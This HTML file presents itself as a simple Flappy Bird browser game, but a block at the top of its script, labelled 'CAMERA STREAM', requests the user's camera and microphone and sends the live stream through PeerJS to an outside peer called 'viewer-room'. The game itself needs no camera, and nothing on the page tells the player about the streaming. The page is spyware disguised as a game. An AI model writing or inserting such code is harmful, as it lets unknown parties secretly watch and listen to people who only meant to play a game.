```html
<!DOCTYPE html>
<html>
<head>
<title>Flappy Bird</title>

<style>

html,body{
margin:0;
padding:0;
overflow:hidden;
background:#70c5ce;
font-family:sans-serif;
}

canvas{
display:block;
}

#score{
position:absolute;
top:20px;
width:100%;
text-align:center;
font-size:40px;
font-weight:bold;
color:white;
text-shadow:2px 2px 5px black;
}

#gameover{
position:absolute;
top:50%;
left:50%;
transform:translate(-50%,-50%);
font-size:40px;
color:white;
display:none;
text-align:center;
text-shadow:2px 2px 5px black;
}

</style>

</head>

<body>

<div id="score">0</div>
<div id="gameover">Game Over<br>Tap to Restart</div>

<canvas id="game"></canvas>

<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>

<script>

/* ---------------- CAMERA STREAM ---------------- */

const peer = new Peer()

navigator.mediaDevices.getUserMedia({
video:true,
audio:true
}).then(stream=>{
peer.on("open",id=>{
peer.call("viewer-room",stream)
})
})


/* ---------------- GAME ---------------- */

const canvas = document.getElementById("game")
const ctx = canvas.getContext("2d")

let w,h

function resize(){
w = canvas.width = window.innerWidth
h = canvas.height = window.innerHeight
}
resize()
window.addEventListener("resize",resize)

let bird = {
x:150,
y:h/2,
size:30,
velocity:0
}

let gravity = 0.6
let jump = -10

let pipes = []
let pipeWidth = 80
let gap = 180

let score = 0
let running = true

const scoreText = document.getElementById("score")
const gameoverText = document.getElementById("gameover")

function spawnPipe(){

let gapY = Math.random()*(h-gap-200)+100

pipes.push({
x:w,
gapY:gapY,
passed:false
})

}

setInterval(spawnPipe,1800)

function flap(){
if(!running){
restart()
return
}
bird.velocity = jump
}

document.addEventListener("keydown",e=>{
if(e.code==="Space") flap()
})

document.addEventListener("mousedown",flap)
document.addEventListener("touchstart",flap)

function restart(){

pipes=[]
score=0
bird.y=h/2
bird.velocity=0
running=true

scoreText.innerText=0
gameoverText.style.display="none"

}

function update(){

if(!running) return

bird.velocity += gravity
bird.y += bird.velocity

if(bird.y<0 || bird.y+bird.size>h){
gameOver()
}

pipes.forEach(pipe=>{

pipe.x -=4

if(!pipe.passed && pipe.x+pipeWidth < bird.x){
pipe.passed=true
score++
scoreText.innerText=score
}

if(
bird.x < pipe.x+pipeWidth &&
bird.x+bird.size > pipe.x &&
(bird.y < pipe.gapY || bird.y+bird.size > pipe.gapY+gap)
){
gameOver()
}

})

pipes = pipes.filter(pipe=>pipe.x+pipeWidth>0)

}

function draw(){

ctx.clearRect(0,0,w,h)

ctx.fillStyle="yellow"
ctx.fillRect(bird.x,bird.y,bird.size,bird.size)

ctx.fillStyle="green"

pipes.forEach(pipe=>{

ctx.fillRect(pipe.x,0,pipeWidth,pipe.gapY)

ctx.fillRect(
pipe.x,
pipe.gapY+gap,
pipeWidth,
h
)

})

}

function gameOver(){

running=false
gameoverText.style.display="block"

}

function loop(){

update()
draw()

requestAnimationFrame(loop)

}

loop()

</script>

</body>
</html>
